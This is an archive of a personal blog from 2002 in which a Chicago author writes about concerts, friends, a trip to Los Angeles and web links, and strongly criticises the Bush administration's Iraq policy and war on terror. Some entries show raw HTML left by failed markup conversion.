                <p>So I pretty much finished my project for work. I am done and now it is sent to another group to test it. Wooha. <br />this weekend was nice. I finally got some sleep. but for some reason I wasted all of my sleep by staying up til like 4 last night. ugh. I need to stop doing that. hopefully tonight will be super calm. laundry.. chillin.. maybe audrey hacking. .yea know<br /><br />So friday.. matiss, his friend(and hopefully my friend) katherina and myself all went to see slayer. I was not impressed. I mean it was good and all. but the compared to like a dimmu borgir show.. or even connibal corpse.. they sucked. I love black metal and gore metal so much more than whatever you would classify slayer as.. so we left.. and went out to the prodigal son and the to exit. it was fun. at the prodigal son.. I met a friend of mine from junior high. it was fun. I didn&#8217;t really know what to expect.. but it turned out very good. I also met a friend of mine from college. I hadn&#8217;t seen both people in a very long time. I think that growing up and seeing how others progress is very interesting. I am sure that it will only continue to get more and more interesting. <br /><br />Today some bush aids decided that <a href='http://www.washingtonpost.com/wp-dyn/articles/A61040-2002Aug25.html'>bush doesn't need to ask congress</a> if he decides to attack iraq. sweet. so we can start a war without public acceptance. this better not happen. and apparently in delaware, <a href='http://www.chron.com/cs/CDA/story.hts/nation/1548489'>future crime</a> and the associated suspects are being experimented with. wheee. minority report is here. <br /><br />I am getting so fed up with CNN. they purchased those silly tapes from a probable &#8220;terrorist&#8221; for an inordinant amount of money.. and now they are attempting to milk it for all they can get. They are ignoring the real news. and are concentrating on things that do not matter. and are of no national relevance. missing girls.. yea. that is a big deal.. but I think the fact that there is a large amount of strife and discontent in the world toward the U.S. is worth more than a paragraph hidden in the world section. also.. why doesn&#8217;t the U.S. media cover the president how he really is. rather than act like he rules. eek. how annoying.</p>

                <p>something is strangely off about today. maybe it is the cloud cover.. maybe the temp. maybe the wind.. maybe the lack of reality within my already pallid life.. maybe the drama I make up in sentences like the last one. ;).. but no matter what it is.. it looks like bush and his iraq issue is coming to a head.<br /><br /> apparently a outspoken and often-ally of bush is making statements about how <a href='http://www.guardian.co.uk/Iraq/Story/0,2763,775532,00.html'>an attack on iraq would lead to apocalypse</a>. Notice how the link is to a british newspapar. it is pretty screwed up that the U.S. media will not print ANY dissident viewpoints.It is rather disappointing that coverage of something like this is so based outside of the U.S. Meanwhile <a href='http://www.cnn.com/2002/WORLD/meast/08/15/iraq.us/index.html'>Iraq is mobilizing its military</a>. Well duh! Iraq is also trying to <a href='http://www.cnn.com/2002/US/08/16/un.iraq.ap/index.html'>appeal to the UN for continued talks</a> &#8230; and all the while <a href='http://www.cnn.com/2002/ALLPOLITICS/08/16/bush.iraq/index.html'>bush talks his rhetoric</a>.. how does the U.S. put up with him. he is ruining the world. He broke the economy(not just him mind you.. but he certainly didn&#8217;t help it).. he broke the world&#8230; he destroyed the trust the world had for us.. he let the terrorists win.. he is a horrible president. I really feel that he shoudl be impeached. and not for some frilly shit like clinton.. he should be impeached for trying to start world war three. for being a war monger and a bully. for abandoning our world leader roll for a smaller and much more dangerous roll of world bully. I think it is time to start the movement to remove him from office.. via democratic response to his insane policy. <br /><br />i have been thinking a lot about the statement &#8220;the terrorists have already won.&#8221; and I have come to the conclusion that the terrorists won the moment the U.S. allowed our everyday life to be affected by the terrorist actions. I don&#8217;t think we shoudl have ignored the attack on new york, but I do not think that war is the answer.. that showed the terroist organizations that we are effected by terrorism. If we would have just rebuilt the WTC and made our security systems tighter.. fixing the problems.. we would have appeared very strong to the terrorist camps.. however.. with our continued attacks&#8230;jeers and whatnot.. we appear as cowards.. a giant nation that is brought down to its knees by a small group of angry and militant people. look at other countries.. like pakistan, isreal, india, n. ireland.. etc.. they all deal with terrorism.. but they do not let it affect and change their daily lives.. bush lost the war on terrorism the moment he started it. and unfortunantly the U.S. people did not stop it quick enough(or at all) to halt any of the worldly damage that we did&#8230;</p>

                <p>last night we went to go and see the movie signs. it was wonderful. I liked it. The first time I asw it.. it was at that crazy chimaman theatre in LA. I wish that was pronounced laa. like I live in laa.. heh. too bad. stupid cars. <br />After the movie.. hiromi &#8220;dragged&#8221; us to a bar.. I say dragged&#8230; because we didn&#8217;t really know anyone.. but I wanted to go anyway. I saw some friends there.. which is always nice.<br /><br />today has been good again..(in terms of links).. we got a <a href='http://taat.planet-d.net/taat/porrasturvat/'>game</a> where you throw a little man down stairs in order to get a good score.. and a funny <a href='http://www.nottingham.ac.uk/~ulzkls/Advertisement.htm'>ad</a>.. oh and lest I forget.. go <a href='http://homepage.mac.com/davezilla/'>here</a><br /><br />I always wonder why people are surprised when the internet <a href='http://www.syracuse.com/news/poststandard/index.ssf?/base/news-3/1029230304179082.xml'>turns</a> out to be just like real life. I think people should assume that it is more sketchy than real life. I mean you can&#8217;t know anything about the person. this is gunna really screw up how kids are sociallized in the future. <br /><br />has <a href='http://www.worldtribune.com/worldtribune/breaking_1.html'>it</a> started?</p>

                <p>Tonight we watched shark week for awhile. It was great. The air jaws show was incredible. I think that sharks could singlehandedly be the coolest animal I have ever seen. Sharks are like aliens.. hehe but we get to see them. and hang out with them. they look so foreign. so mean. so evil. and so so cool. <br /> speaking of aliens. we are going to see signs soon.</p>

                <p>tonight was kinda fun. it is the third night in a stint of going out.. and drinking too much.. not really too much.. but more than I should on a school night. I imagine the weekend will be very nice to have happen. <br /><br />right right.. <br />anyway.. so tonight some friends and myself went to smartbar.. where moby was hanging out. it is funny to hang out with moby. I mean we didn&#8217;t chill or anything but I sat at the same booth as moby did. which will be my claim to fame. heh. he is shorter than I expected and he is very very white. similar to myself ;).. oh and very bald. he has a tattoo of a cross on the back of his neck. which I was not aware of. people were takign pictures of him a lot. <br />it was really funny.<br /><br /> anyway.. the exciting part of the evening was the cab ride home. I met a guy named jamal.. who talked about his experiences in pakistan.. in the us and his experiences being a muslim in our strange and very white(moby) world.. it was great. I love talking to people about stuff that matters. well matters is an interesting concept.. but at least.. stuff that is interesting and isn&#8217;t fashion. <br /></p>

                <p>So I am now at work. Vacations are nice. some would say vacations are kick ass. I woudl tend to agree. The last couple days have been a DVD binge. I purchased 19 dvds from my brothers hollywood video store and got 11 from hong kong. I am excited. Soon I will have to make a dvd database so you can all peruse my dvd collection. I also plan on buying a new tv soon.. probably a wega. but I don&#8217;t know.. ifyou have suggestions.. send em my way.<br /><br /></p>

<p>while everyone was paying attention to <a href='http://www.cnn.com/2002/HEALTH/08/06/conjoined.twins/index.html'>nothing</a>.. the <a href='http://news.independent.co.uk/world/politics/story.jsp?story=321916'>world</a> has <a href='http://www.guardian.co.uk/Iraq/Story/0,2763,769851,00.html'>rejected</a> the US plan to attack Iraq. but thankfully.. <a href='http://story.news.yahoo.com/news?tmpl=story2&amp;cid=544&amp;u=/ap/20020806/ap_on_go_pr_wh/bush_medical_2&amp;printer=1'>our leader is handling it ok</a>.. <br /> <br /></p>

<p>And apparently <a href='http://rense.com/general27/canned.htm'>Monfort is still bad</a>.<br /> but the <a href='http://www.marketwatch.com/news/story.asp?guid=%7B415DC9C0%2D455B%2D43B7%2DA32B%2DFF32C0A1B655%7D&amp;siteid=yhoo'>market</a> is coming back.</p>

                <p>I am now in L.A. visiting my brother.. I have wrote the following entries on the road.. and thus they are out of order.. well they are in order.. but not entered seperatly. whatever.. here it goes..</p>
<hr />
<p>So I just got done watching arlington road and part of edward scissorhands on the way to California. My laptop apparently had enough battery life to support almost 2 dvds. It rules. I am happy about that.. because now I know it will last around 4 hours while watching full motion video and while spinning a dvd drive. Without the dvd drive in the machine I expect to get around 2 more hours of battery time. <br /><br /></p>

<p>While getting ready to travel to California.. I happened across an interesting quandary. I don?t own shorts. Heh. What to do. I don?t think I am ready for summer. Oh wait it is summer. Heh. Whoops. I guess I will get shorts in cali. Hmm. <br /></p>

<p>I am going to visit Compton. I can now say that I have been to Englewood. And long beach.<br /> LBC<br /> Ahh yea<br /> Anyway..<br /></p>

<p>Right<br /></p>

<p>Ohh.. I got my immortality rings. .hopefully they work. I kinda forgot to bring them. I wore them last night while sleeping and it annoyed me. I ended up taking them off.</p>
<hr />
<p>The weather is very nice here in cali. It is around 75?85 degrees, A pleasant change from the violent heat of Chicago. Yesterday we arrived and got a quick tour of LA and long beach. We got a room at the queen Mary hotel. Which is HUGE. A very large boat, quite a spectacle. Apparently it is somehow related to the titanic, although I am not sure how. We then slept in our small compartmentalized room. The next day we hung out in long beach. We took a tour at Dylan?s college. It is quite something. I kind of wish that I was in a program or had been in a program like his. It is so neat and there are so many opportunities present in his field. He is doing spectech, which is non-destructive-testing.. it seems like a cool thing. He would be doing analysis on anything and everything. For money. I really don?t know what it would be like&#8230; but it looks cool? <br /><br /></p>

<p>Then we went and drove down the coast. The ocean is so cool. It is almost shocking. It reminds me of the mystery and excitement I had when I first moved to Chicago. It makes me wonder if I should move on to another place, city or whatnot. I like Chicago.. but the coast is very nice. Although I am somewhat harmed by the suns powerful rays.. it is very pretty and incredibly mind blowing. <br /></p>

<p>I gotta go.. we are gunna walk along the beach or something ;)<br /></p>
<hr />
<p>Today we were tourists. it was nice though. we went to silly rides at universal studios.. and we hung out at hollywood. heh. hollywood is not as cool as I thought it would be. the china-Mann??? theatre is rather nice though.. and the weather is wonderful. the weather the whole trip has been brilliant. I enjoy having the oppurtunity to be chilly. what an idea.</p>

                <p>yep its true. ihad blueberry soup last night. I cannot lie. it was tasty. a little out of control.<br /><br />Do you want to be a <a href='http://ironkungfu.com/wiki/index.php/RockStarScenester'>Rock Star Scenester</a>?<br /><i>Bush warns CEOs: 'You'll be exposed'</i> - I wonder if they will expose bush in the process of bush exposing them.

I certainly hope that the general population notices that he is a <a href='http://www.newyorkmag.com/page.cfm?page_id=6228'>crook</a> and lets our <a href='http://www.timesonline.co.uk/article/0,,3-368297,00.html'>lovely leaders</a> <a href='http://www.aclu.org'>notice</a>.

                <p>Today has been weird. I am almost done with my encyclopedia. like pretty much finished. so I am in a rut.. trying top find all of the little things to do.. and to clean up. I am excited to see how it does.. but I spent a small amount of time looking at some links I found.. <br /><br /> <a href='http://www.rathergood.com/mark/'>britPOP</a> fans unite. this is a very very strange flash movie. derigerbil!!!. <a href='http://mohsye.com/games/breeder.swf'>here</a> is a good flash game.. you have to breed bunnies. Once when I was in high school my friend <a href='http://www.in5anity.org'>jon</a> and I started experimenting with potato guns. we made all sorts of designs. This was before any crazed fool would make a <a href='http://216.25.100.182/detail.asp?id=26'>website</a> giving help, plans and kits out. It is nuts.. we used to break so much stuff with them. heh. The website is good, and it has a funny quote about one of the guns they <a href='http://216.25.100.182/detail.asp?id=23'>designed for the air force</a>: <blockquote>"<i>The Army spec was that it be powerful enough for a tennis ball to dent 25 mil (0.025") aluminum sheet from 20 feet away. At 100 psi it will probably send a ball THROUGH 1/4" plate.... I fired one ball out of it down into a swimming pool; the ball bounced off the water and went a few blocks in the air before I lost sight of it!</i>"</blockquote> hehe. <br /><br /><a href='http://blog.hotornot.com/'>this</a> isn&#8217;t as fun as the pretty girls ones.. but it is still funny and it peaks my voyeuristic tendencies. here is a <a href='http://www.blognewsnetwork.com/members/0000004/images/2002/07/24/bomb-1.jpg'>funny picture</a>. I think <a href='http://onyx.malagraphixia.com/H&K_MP5/H&K_MP5.htm'>this</a> is a lego machine gun When I grow up I want <a href='http://www.lesters.com/titanic.htm'>this</a> slide in my backyard. maybe then my <a href='http://homepage3.nifty.com/pee/bun.html'>cats</a> will come back. you can <a href='http://subintsoc.net/madlib.php'>make your very own</a> terror press release. <br />see if you can <a href='http://www.dogbomb.co.uk/display.php?page=waldo'>find waldo</a>!!</p>

                <p>Last night, Kinnera, matiss and myself all went to the smoking grooves tour. It was ok. the tweeter center sux0rs. It has such bad acoustics. horrible. sounds like hell. I got better acoustics in my leg. We saw the <a href='http://outkast.com/'>outkast</a>, the <a href='http://www.theroots.com'>roots</a>, <a href='http://www.lauryn-hill.com/'>Lauryn Hill</a> and <a href='http://www.jurassic5.com/'>Jurassic 5</a>. It was kind. <br /><br />please take a minute and check out <a href='http://www.mnftiu.cc/mnftiu.cc/war12.html'>this</a>. It is one of my favorite comics. Also <a href='http://www.demian5.com/'>this</a> is incredible. It is so fun and I love it. In other strange and real news.. Matiss and I watched the mothman prophecies the other night. it was weirdly scary. Not in a normal sense at all. just surprisingly scary every once and awhile. kinda strange. Matiss did some research and he found <a href='http://www.prairieghosts.com/moth.html'>this</a> site. whee.. <a href='http://www.upi.com/view.cfm?StoryID=20020725-100255-1720r'>men in black</a>. <br /><br />goddamn <a href='http://rense.com/general27/plstt.htm'>cheney's america</a>.. I guess <a href='http://www.washingtonpost.com/wp-dyn/articles/A59423-2002Jul24.html'>some people are looking out for us</a>.. but it appears that the <a href='http://news.bbc.co.uk/2/hi/science/nature/2148924.stm'>gods are not paying attention</a>.. ugh.. that will not be a fun experience.. <br /><br />oh.. and I forgot to mention.. we finally have completed the slot car purchases. our collection is complete. so I guess we will be having a slot car party soon enough. it should be fun. we need more cars though.</p>

                <p>So anyway. this weekend was incredibly hot. like not fun hot. I was not excited. I can&#8217;t quite remember what exactly went down this weekend. but I think we mostly hung out. My friend brock and amanda hung out on thursday.. friday I hung out with my friend sevren and some of his friends. they are so &#8220;classy.&#8221; hehe. but the real gem(hehe) was on saturday. Some new friends of ours came over about one.. we went downtown and hung out and I street performed with matiss. We got there late.. which sucked for matiss. he had arrived downtown around seven.. an had to juggle without a break until like 1:30 or 2:30. that was rough for him I think. anyway. after we juggled.. we went to whole foods and got a whole bunch of food and cooked it in a big group effort. it ruled.We played slot cars(of course) and the letter game. and all sorts of other things. we then went to a birthday party and eventually to sleep. Then came the evil of sunday. however.. we killed the heat with bad movies.. reading.. and board games.. ugh.. so so hot.<br /> <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

&lt;li&gt;I guess that we get a police state for our summer present. I am &lt;a href=&quot;http://www.washingtontimes.com/national/20020722-6619304.htm&quot;&gt;excited&lt;/a&gt;. It seems that quite a few politicians want to give the military policing power. I think that this woudl be a bad idea. </pre></p>

&lt;li&gt;Gore apparently for some silly reason claims that &quot;&lt;a href=&quot;http://story.news.yahoo.com/news?tmpl=story2&amp;cid=664&amp;u=/ap/20020721/ap_to_po/gore_3&amp;printer=1&quot;&gt;Bush lied about the nation&apos;s economy.&lt;/a&gt;&quot; Gore is probably sore about losing or something. 

&lt;li&gt;It seems that the number of sexually active teenagers has &lt;a href=&quot;http://www.washingtontimes.com/national/20020722-76660856.htm&quot;&gt;dropped&lt;/a&gt;. Wierd. 

&lt;li&gt;The Rainbow/PUSH Coalition Conference 2002 has officially made a call to initiate a &lt;a href=&quot;http://www.suntimes.com/output/news/cst-nws-push21.html&quot;&gt;probe&lt;/a&gt; into the corporate accounting scandals of the GOP. It seems that &quot;President Bush&apos;s trading in corporate stock and Vice President Dick Cheney&apos;s tenure as chief executive of Halliburton Co., as well as activities by other high-ranking administration figures, were questionable enough to merit a Ken Starr-type federal investigation.&quot;

&lt;li&gt;I love when reality becomes similar to the beginning of a horror movie. the pentagon is attempting to create &lt;a href=&quot;http://www.time.com/time/nation/article/0,8599,322588,00.html&quot;&gt;nonlethal weapons&lt;/a&gt; that hurt but don&apos;t kill. This is where a strange and undocumented side effect creates zombies.. or turns people into mindless killers. hehe. we can only hope ey. yea. wierd.
&lt;li&gt;a friend of mine wrote &lt;a href=&quot;http://www.stoneeye.com/eyetalknow/oped/07-20-02.html&quot;&gt;this &lt;/a&gt; commentary about the auto industry. It is an interesting read.
&lt;/ul&gt;</pre>
<p>Well I supposed that is all. Soon I goto california. and I get to visit my brother. it shoudl be a good time. I am excited. I want to go on dates with girls someday. heh. I may be dreaming again. huh. haha.</p>

I caught the water bottle they threw at the crowd, but gave it to the women in fron tof me who wanted it so much better. this is the second concert in as many months that I have caught a water bottle at. wierd.

                <p>bush and cheney get to have a good time justifiing their actions soon. It looks as though cheney <a href='http://library.northernlight.com/FB20020714470000019.html?cb=0&amp;dx=1006&amp;sc=0#doc'>knew about some of the sketchy business practices</a> that he questioned. It also is strange that the person that bush picked to be the head of corporate task force was <a href='http://channels.netscape.com/ns/news/ns/story.jsp?floc=FF-PLS-PLS&amp;id=403959968&amp;dt=20020713185500&amp;w=RTR&amp;coview='>was previously</a> the head of a credit-card company that paid more than $400 million to settle allegations of unfair and deceptive business practices. Nice work. and one of the most exciting news is that the U.S. may <a href='http://www.fortune.com/indexw.jhtml?channel=artcol.jhtml&amp;doc_id=208698'>lose 5% of its GDP because of the bankruptcies</a>.. thats rough.. and after an intense investigation the shocking <a href='http://library.northernlight.com/FE20020715440000099.html?cb=0&amp;dx=1006&amp;sc=0#doc'>discovery, that bush's priorities may be out of wack</a>.<br /><br />i guess today wasn&#8217;t so bad. work was fine. I did a lot of neat coding. I am almost finished with this web application.. I may have gotten some more work. whee. I am excited both to have too much work to do and to not do any work. what a dichotomy. eh. <br />i am currently reading a book about two kids that grew up in the projects here in chicago. It is called <a href='http://www.amazon.com/exec/obidos/ASIN/0385265565/nata2productions'>There Are No Children Here</a>. It always makes me sad to read books like this. the hopelessness.. it is rough. When you combine a story like this.. and show the rough core of the U.S. and then you show the collapse of our economy and our strong moral <a href='http://www.bitchmech.com'>fibre</a>.. it leads me to wonder when our country will go the way of th U.S.S.R. hah. it is scary.</p>

                <p>heh. hah. hoh. Yea. so this weekend was great. it really was. Quite something. On friday, I got up a little late. Not too late. but late enough to feel like a rebel.. and I went to work. I was able to wear jeans.. cuz friday is casual.. hah. so I worked.. and then I got home&#8230; and went to a couple art openings.. The one that was memorable was <a href='http://apt1r.com/main/current_show.html'>A curatorial collaboration using the work of Jimmy McBride</a>(heh). It was quite nice. A couple of my friends helped him make it. so it was interesting to see poeple I knew in his work. After that we went back to our place and hung out for a bit. I was real hungry so I went to lula(accross the street).. Lula was a trip.. due to my semi-drunkeness and the fact that I was reading camus. Camus and drunkeness is funny. at lula.. my friend Marianne was working.. so it was nice to get to talk to her a little and hang out. And then at twelve.. I went to a movie/death metal show. The movie was <a href='http://www.stomptokyo.com/otf/Nekro/Nekro.htm'>Nekromantik</a>. Which is an incredibly gross movie. I had fun. so I went home and slept. heh. <br /><br />and then it was saturday. I love this play by play post. it is funny and fun to write. hah. anyway. I got up saturday.. and cleaned my apt. a little. we have quite the mess in the living room.. with all of my slot cars. it is humorous hat we have so much slot car stuff. I have like 3 more sets coming. it is insanity. totally nuts&#8230; which brings me to saturday. so I was cleanign and hiromi and cole mentioned that I shoudl come over to coles house and hang out. so I jaunted over to coles and we hung out a bit. I kept getting this wierd urge to own a cowboy hat.. so I explained to cole and hiromi my urge and we decided to swing by a western wear store. At the store I decided that it would be a good plan to dress western for the evening. so I purchased a nice shirt, a hat and a really nice belt/belt buckle. I looked suave. I had it going on. hah. so much fun. soon afterwards.. we went to a friends birthday party and hung out. haha. so much hanging out. Cole, being a facilitator of cooperative games for a living facilitated some cooperative games for the group. we played &#8220;who is the leader,&#8221; &#8220;tail of a monkey,&#8221; and &#8220;ride my pony.&#8221; It was quite fun. After ride my pony was done.. we decided to go onto our next step pin an evening of joy. Marianne had told me about a party that was goign to be at her friend uv&#8217;s house. he has quite a house. we went there and found that it was a capoeira party. heh. so muhc fun to watch. we chilled at his place for awhile and then started playing more cooperative games.. such as the human knot and pass the loop around a circle. Quite nice. we then left and came home.. ate and slept. so nice. and that brings to today.</p>

                <p>I am not a veyr good typist&#8230; you too can achieve this goal. . check it out <a href='http://typera.solutions.fi/'>here</a>. <br /><br /> Last night I went and saw <a href='http://blackalicious.com/'>Blackalicious</a> in concert. It was pretty good. The crowd was rather lame. A bunch of frat-like guys.. they were so annoying. but whatever. The gift of gab can speak very quickly.. sometimes I thought he wasn&#8217;t actually speaking.. he seemed to just make utterances.. but what is speaking really..heh.<br /><br />bush always succeeds in making me so mad. I don&#8217;t know why he pisses me off so much. It is silly I know. However.. it is interesting to note that quite a few of the editorials featured in the world press review for july/june are very critical of bush and the U.S. war on terror. A couple of them have stated that the world does not want this fanatic witch hunt that the U.S. is forcing(i made those words up.. they were far more eloquent). It is neat to read opinions of very smart individuals who agree with me. hah. whatever.<br /><br />oh yea.. <a href='http://derek.broox.com/videos/smallCIA.wmv'>here</a> is a movie a <a href='http://www.derek.broox.com'>friend</a> made withhis little cousins..</p>

                <p>i love the internet. Awhile back I posted <a href='http://111111111111111111111111111111111111111111111111111111111111.com'>60X1.com</a>, I finally took the time to finish it and much to my chagrin it led me to some amazing sites:<br /> <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;li&gt;&lt;a href=&quot;http://www.tinkin.com/&quot;&gt;tinkin&lt;/a&gt; - this is the guy who made 60X1.com he has a bunch of really great anti war stuff. it is so good. it makes me happy I want to give this site to everyone as a gift. I think that politics is often forgotten when it comes to internet art. it is refreshing. but it reminds me that &lt;a href=&quot;http://www.tinkin.com/peacefront.html&quot;&gt;we are all sinners&lt;/a&gt; &lt;a href=&quot;http://www.tinkin.com/taliban.html&quot;&gt;in&lt;/a&gt; this &lt;b&gt;terrorist v terrorist&lt;/b&gt; fight.
&lt;li&gt;&lt;a href=&quot;http://www.hoogerbrugge.com/&quot;&gt;hoogerbrugge&lt;/a&gt; seems to be an incredible designer. I am a big fan of &lt;a href=&quot;http://www.thethirdplace.com/&quot;&gt;this&lt;/a&gt; style. It is like other &lt;a href=&quot;http://www.requiemforadream.com&quot;&gt;sites&lt;/a&gt;. I don&apos;t know if that guy is in hitek or whatever they are called. but he is incredible. especially his &lt;a href=&quot;http://www.hoogerbrugge.com/ml.html&quot;&gt;Modern Living&lt;/a&gt; set. 
&lt;li&gt;&lt;a href=&quot;http://www.surfstation.lu/&quot;&gt;Surfstation&lt;/a&gt; - I haven&apos;t had a lot of time to check this out. but it seems to be what I need. 
&lt;li&gt;&lt;a href=&quot;http://www.alternet.org/&quot;&gt;Alternet&lt;/a&gt; - this is an alternative new source. it seems to fit rather well with what I feel. Check out &lt;a href=&quot;http://www.alternet.org/story.html?StoryID=13554&quot;&gt;this&lt;/a&gt; article called &quot;Bush Threatens Future of Peacekeeping.&quot;
&lt;li&gt;&lt;a herf=&quot;http://www.23dpi.com&quot;&gt;23dpi&lt;/a&gt; is more along the lines of the sites I do. But it is done with style. hah. whereas the sites I do are done with a crayon. 
Well. I am out of here.. here being work.. work being ok. java being dumb. metallica being humorous. do you think the internet will become like shadowrun. I hope so. </pre></p>

                <p>once again theree is a carnival in front of my house. it is quite strange. rather confusing really. I don&#8217;t think I ever imagined waking up to the wonderful sounds of the carnival. but whataver.. heh. tonight I went to innjoy to see my friends brock and amanda dj. they are nice deejays. they play electro, which is becoming fun to listen to. I really do feel that industrial music will spawn from this. <br />i then hung out with my marianne for awhile. it is nice. I like her. quite fun. and now I should sleep.</p>

                <p>so today.. I didn&#8217;t get up at the time I was supposed to. I mean I wasn&#8217;t really late. but I had planned to get up and do something.

I went out with a friend. it was really great. we got italian ice. and hung out.. went to a park. chilled. it was a great night out. I love how people say. its a great night out. for some reason it seems so nice right now. that phrase. but whatever. I laugh a lot at my own minds meandering.. I wonder if it as amusing to others as it is to me. probably not. so anyway. I had a great time. <b>;)</b>.<br /><br />so my friend robyn has a profile on moc. heh. and she also has a <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

It was a good time. we hung out. I traded in some of my dvds. they will enjoy thenm I think. My friend pam came over. we hung out for a bit.. and then went to liars club. heh. and we got in for a reduced price because pam is a rockstar. heh. yep she is. but as soon as we got to liars club, pam told us that the party was really at spybar.. so we went to spybar. the party.. was supposed t be ref-haired matt, korn and us. haha. I really don&#8217;t know what was going on. but they were supopsed to be there.. heh. so we hung out in the VIP section for awhile&#8230; and we got a great picture with this really great women.. named.. well. I don&#8217;t know.. but she was cool.. and pretty. heh. anyhow.. we got a picture with her. .randomly.. the photgrapher I think new her or something. heh. it was crazy.. and then we left.. We tried hard to subvert the system. but it was hard. the bar scene is so closely knit. heh. whatever. and now I am home and it is past 4:35. uh oh. and I got to get up for a garage sale tomarrow. <br /><br /> whoa</p>

                <p>It is kinda interesting to be at work when everyone else is on vacation. I got a free vacation day for not tacking any days off last year. I am dedicated. hehe.<br /><br /></p>

<p>From my new <a href='http://www.cockeyed.com/'>favorite site</a>:<br /></p>
<b>15. When are you going to grow up?</b>
<p>I need to find a woman I want to marry, which will lead to a house &amp; kids OR some horrible tragedy will strike &amp; will be shaken into adulthood<br /><br /></p>

<p>Very true.<br /><br />Well. I am glad that no terrorist plot succeeded yesterday(that we know of), and it is unfortunant that a gunman shot people at LAX.</p>

<p>We could be in for some <a href='http://www.cnn.com/2002/US/07/05/iraq.usa.reut/index.html'>trouble</a>. I think it is interesting that almost every country has called for the U.S. to NOT attak Iraq.. yet we still need to oust a axis of evil. I hate our politicians foreign policy right now. It is so annoying.</p>

It was a great time. It was incredible. The audience was receptive.. the juggling went well. We didn&#8217;t drop at any pivitol points.. heh. and we got contacts for more gigs. <br /><br />I am very interested in what is going to happen in the marrow. I wonder if the &#8221;<a href='http://www.georgebush.com/'>terrorists</a>&#8221; will attack. I hope not, however it would be interesting to see what plans are foiled.

                <p>I laughed when I heard that the U.S. &#8220;finally&#8221; <a href='http://www.cnn.com/2002/WORLD/asiapcf/central/07/02/afghanistan.bombing/index.html'>bombed a civilian target</a>. I did not laugh because I find the killing of civilians to be funny, I laughed because of the ridiculousness of the entire situation. Of course we were bombing civilian targets. Of course we have killed thousands of afghans. this is, in my opinion, part of the war against terrorism that our illustrious president has so eloquently fought. <br /><br />My favorite part is how our &#8221;<a href='http://www.honestreporting.com/'>one sided</a>&#8221; media suddenly reported a story that is contrary to the U.S. being the &#8220;best&#8221; and in the right in all situations. And in response to this criticism, the government <a href='http://www.washingtonpost.com/wp-dyn/articles/A9534-2002Jul1.html'>defends itself</a>. I think that this is the same kind of situation you have.. when a cop shots a kind in the face because he &#8220;could have&#8221; had a gun. Those afghans at that wedding could have been armed and taliban and evil and full of anti-aircraft fire. And to be safe.. when a firecracker, or a candle, or an anti-aircraft missle, or a small child is seen.. we must annialate.<br /><br /><small><b>Tikibrah (</b>9:45:21 AM<b>)</b>: and those killed people in afghanistan are being unpatriotic</small><br /><br /> I think it is time to remember enron and how chaney and bush were <a href='http://rense.com/general26/dontkn.htm'>involved</a>. Also, let us not forget the <a href='http://channels.netscape.com/ns/news/ns/story.jsp?floc=FF-PLS-PLS&id=403628696&dt=20020702061000&w=RTR&coview='>gay mafia</a>.

                <p>I pledge allegiance to the flag of the United States of America, and to the Republic for which it stands, one nation under God, indivisible, with liberty and justice for all. <br /><br />the U.S. has proven what a dumb ass country we are:<br />&#8220;&lt;I&gt;The Pledge, as currently codified, is an impermissible government endorsement of religion because it sends a message to unbelievers that they are outsiders, not full members of the political community, and an accompanying message to adherents that they are insiders, favored members of the political community.&lt;/i&gt;&#8221;<br /> This seemingly obvious statement was made by the 9th circuit supreme and is being fiercely attacked by religious, ignorant and conservative people all over the US. It seems to me, that the separation of church and state is somewhat needed. Especially in this era. We, the US, are too diverse to pledge allegiance to one god. <br /><br /> Bush said the ruling was &#8220;out of step with the history and traditions of America,&#8221; and said it highlighted the need for &#8220;common sense judges that understand that our rights are derived from God.&#8221; <br />heh. he is kinda dumb. It is funny that this is such a big deal when it was added less than 50 years ago. It hasn&#8217;t been apart of our &#8220;tradition&#8221; very long. I also find it funny that ALL of our leaders our christian. Of course they wouldn&#8217;t have a problem with this.<br /><br />Here are some links:<br /></p>

                <p>heh. I am a dork. so matiss and I went to the KMFDM concert like 1 hour early so we could get good seats. We showed up adn there was a block long line. we pushed and pulled our way through it and got seats right in the center of the stage. We stood and waited through two not very good bands(kidney thieves and 16 volt) and suddenly right before 16 Volt came on - the kids in front of us left. it was weird. I guess they were there for Kidney thieves(which is a weird thing to like heh). anyway. so by the time KMFDM came on.. we had front row seats.. whee. it ruled<br />KMFDM was incredible. sascha really rocked the house. and pig, who is an incredibly large person(tall), was great as well. Lucia was really fun to watch&#8230; especially because we were so close. heh. it was wonderful. in the end.. I was so tired.. and soaking with my own and others sweat.. heh. it was great. hah..</p>

                <p>I got all my computers yesterday. I think I got some more work. which leads to more computers. which leads to more work. or something like that. Yesterday .. I went and played with the <a href='http://heracles.cuties.org/~phunk/gary.jpg'>smallest cat</a> in the world. I want a <a href='http://heracles.cuties.org/~phunk/gary-sleeping.jpg'>kitten</a>. I like kittens. they are so nice.. <br /><br />so anyway.. my computers. the laptop is so so so small. it will be nice to have around. I gotta set up the WLAN so that I can surf porn in the kitchen(eep) or whatever. I am afraid that the range will be rather poor. I also need to get a case for it. I don&#8217;t really feel comfortable just throwing it in my bag willy-nilly.<br /><br />I need to remember to install an operating system on my desktop.. I think I want to put xp on the desktop and 2k/gentoo linux on the laptop. but in the meantime I need to check out this <a href='http://www.blkviper.com/WinXP/service411.htm'>page</a></p>

                <p>Tonight was a great time. I hung out with my friend rachel. how nice. she took me for a ride on her scooter and we went to a really great electro show.. with the fierce exception of trans-am(heh) and we hung with some cool cats. Then we went to clarks.. hugn with more cool cats. heh. and then came home. it was a really great night <br /><br /></p>

